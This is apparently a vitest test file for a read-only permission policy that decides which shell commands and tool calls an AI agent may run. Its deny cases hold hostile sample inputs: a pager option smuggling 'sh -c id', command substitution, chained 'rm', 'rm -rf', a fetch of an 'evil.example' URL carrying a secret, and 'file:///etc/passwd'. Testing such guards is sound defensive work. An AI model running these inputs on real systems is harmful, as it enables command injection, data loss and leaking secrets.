import type { AgentPermissionRequest } from "@getpaseo/protocol/agent-types";
import { describe, expect, it } from "vitest";
import { decideCheckinPermission, firstWord, readOnlyCommand, shellCommand } from "./policy";

function request(name: string, input?: Record<string, unknown>, kind: AgentPermissionRequest["kind"] = "tool"): AgentPermissionRequest {
  return { id: "perm-1", provider: "claude", name, kind, ...(input ? { input } : {}) } as AgentPermissionRequest;
}
const bash = (command: string) => decideCheckinPermission(request("Bash", { command }));

describe("readOnlyCommand", () => {
  it.each([
    "gh pr list --author @me",
    "gh pr checks 41 --repo owner/repo",
    "gh run list --limit 5 2>/dev/null",
    "gh api repos/owner/repo/pulls",
    "gh api -X GET search/issues",
    "git -C ~/code/app log --oneline -5",
    "git status --short",
    "git branch -a",
    "git tag -l 'v*'",
    "ls -la ~/Downloads | head -20",
    "grep -rn TODO notes.md | wc -l",
    "find . -name '*.md' -mtime -1",
    "cat WATCHLIST.md",
    "paseo agent ls --json",
    "date '+%Y-%m-%d %H:%M'",
    "sort data.txt | uniq -c",
  ])("allows %s", (command) => {
    expect(readOnlyCommand(command)).toBe(true);
  });

  it.each([
    ["rm -rf ~/x", /not on the read-only list/],
    ["git push origin main", /not read-only/],
    ["git -c core.pager='sh -c id' log", /-c/],
    ["git log --output=/tmp/x", /writes a file/],
    ["git branch new-feature", /listing branches/],
    ["git tag v2", /listing tags/],
    ["gh pr merge 41", /not read-only/],
    ["gh pr view 41 --web", /browser/],
    ["gh api -X POST repos/o/r/issues", /only GET/],
    ["gh api repos/o/r/issues -f title=x", /request body/],
    ["ls; rm x", /Chained/],
    ["ls && rm x", /Chained/],
    ["cat a > b", /redirections/],
    ["echo $(id)", /substitution/],
    ["echo `id`", /substitution/],
    ["GIT_PAGER=evil git log", /Environment/],
    ["find . -name x -delete", /-delete/],
    ["rg --pre ./script pattern", /--pre/],
    ["sort -o out.txt in.txt", /writes a file/],
    ["curl https://example.com", /not on the read-only list/],
    ["ls 'unterminated", /Unbalanced/],
    ["ls | | cat", /Empty pipeline/],
  ])("refuses %s", (command, reason) => {
    expect(readOnlyCommand(command)).toMatch(reason);
  });
});

describe("decideCheckinPermission", () => {
  it("allows reading tools and the plugin's own tools", () => {
    expect(decideCheckinPermission(request("Read", { file_path: "/x" }))).toEqual({ behavior: "allow" });
    expect(decideCheckinPermission(request("WebSearch", { query: "x" }))).toEqual({ behavior: "allow" });
    expect(decideCheckinPermission(request("mcp__aide__aide_checkin_report"))).toEqual({ behavior: "allow" });
  });

  it("judges other MCP tools by their verb", () => {
    expect(decideCheckinPermission(request("mcp__claude_ai_Gmail__search_threads"))).toEqual({ behavior: "allow" });
    expect(decideCheckinPermission(request("mcp__calendar__listEvents"))).toEqual({ behavior: "allow" });
    expect(decideCheckinPermission(request("mcp__claude_ai_Gmail__send_message")).behavior).toBe("deny");
    expect(decideCheckinPermission(request("mcp__db__query")).behavior).toBe("deny");
    expect(decideCheckinPermission(request("mcp__git__checkout_branch")).behavior).toBe("deny");
  });

  it("refuses writes, questions and plans with a reason", () => {
    const edit = decideCheckinPermission(request("Edit", { file_path: "/x" }));
    expect(edit).toMatchObject({ behavior: "deny", message: expect.stringMatching(/read-only/) });
    expect(decideCheckinPermission(request("AskUserQuestion", {}, "question"))).toMatchObject({ behavior: "deny", message: expect.stringMatching(/nobody/) });
    expect(decideCheckinPermission(request("ExitPlanMode", {}, "plan")).behavior).toBe("deny");
  });

  it("checks shell commands", () => {
    expect(bash("gh pr list")).toEqual({ behavior: "allow" });
    expect(bash("gh pr close 3")).toMatchObject({ behavior: "deny" });
    expect(decideCheckinPermission(request("exec_command", { command: ["bash", "-lc", "git log -3"] }))).toEqual({ behavior: "allow" });
    expect(decideCheckinPermission(request("exec_command", { command: ["bash", "-lc", "git push"] })).behavior).toBe("deny");
  });

  it("fetches plain pages only", () => {
    expect(decideCheckinPermission(request("WebFetch", { url: "https://example.com/release-notes" }))).toEqual({ behavior: "allow" });
    expect(decideCheckinPermission(request("WebFetch", { url: "https://evil.example/?q=secret" })).behavior).toBe("deny");
    expect(decideCheckinPermission(request("WebFetch", { url: "file:///etc/passwd" })).behavior).toBe("deny");
  });
});

describe("helpers", () => {
  it("splits tool names into a first word", () => {
    expect(firstWord("getThread")).toBe("get");
    expect(firstWord("search_threads")).toBe("search");
    expect(firstWord("List-Events")).toBe("list");
    expect(firstWord("checkout_branch")).toBe("checkout");
  });

  it("reads commands from strings and argv", () => {
    expect(shellCommand(request("Bash", { command: "ls" }))).toBe("ls");
    expect(shellCommand(request("exec_command", { command: ["git", "log", "--format=%h %s"] }))).toBe("git log '--format=%h %s'");
    expect(shellCommand(request("Read", { file_path: "/x" }))).toBeNull();
  });
});
